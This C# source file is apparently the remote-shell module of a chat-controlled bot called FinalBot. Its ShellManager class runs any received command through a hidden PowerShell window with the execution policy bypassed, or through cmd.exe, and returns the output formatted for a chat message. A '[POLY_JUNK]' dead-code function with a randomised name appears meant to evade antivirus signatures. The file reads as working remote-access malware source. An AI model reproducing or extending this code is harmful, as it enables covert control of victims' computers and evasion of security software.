using System;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

namespace FinalBot.Modules
{
    public static class ShellManager
    {
        // [POLY_JUNK]
        private static void _vanguard_e2797294() {
            int val = 26937;
            if (val > 50000) Console.WriteLine("Hash:" + 26937);
        }

        public static async Task<string> ExecuteCommand(string command)
        {
            if (string.IsNullOrWhiteSpace(command)) return "Empty command.";

            try
            {
                string shell = "powershell.exe";
                string args = $"-NoProfile -ExecutionPolicy Bypass -Command \"{command}\"";

                // Heuristic: Use CMD for simple/classic commands
                string cmdLower = command.Trim().ToLower();
                string[] simpleCmds = { "dir", "cd", "echo", "type", "del", "copy", "move", "mkdir", "rmdir", "cls", "ver" };
                if (simpleCmds.Any(c => cmdLower == c || cmdLower.StartsWith(c + " ")))
                {
                    shell = "cmd.exe";
                    args = $"/c {command}";
                }

                var processInfo = new ProcessStartInfo(shell, args)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = processInfo };
                process.Start();

                var outputTask = process.StandardOutput.ReadToEndAsync();
                var errorTask = process.StandardError.ReadToEndAsync();

                // Wait up to 10 seconds for command to complete
                bool exited = process.WaitForExit(10000);
                if (!exited)
                {
                    process.Kill();
                    return $"[!] Command timeout after 10s.\nOutput so far:\n{await outputTask}";
                }

                string output = await outputTask;
                string error = await errorTask;

                StringBuilder sb = new StringBuilder();
                if (!string.IsNullOrEmpty(output))
                {
                    sb.AppendLine("```");
                    sb.AppendLine(output.Trim() == "" ? "[Empty Output]" : output.Trim());
                    sb.AppendLine("```");
                }
                if (!string.IsNullOrEmpty(error))
                {
                    sb.AppendLine("⚠️ *Error:*");
                    sb.AppendLine("```");
                    sb.AppendLine(error.Trim());
                    sb.AppendLine("```");
                }

                if (sb.Length == 0) return "✅ Executed (No output).";

                string finalStr = sb.ToString();
                return finalStr.Length > 4000 ? finalStr.Substring(0, 4000) + "\n...[TRUNCATED]```" : finalStr;
            }
            catch (Exception ex)
            {
                return $"❌ Shell Error: {ex.Message}";
            }
        }
    }
}
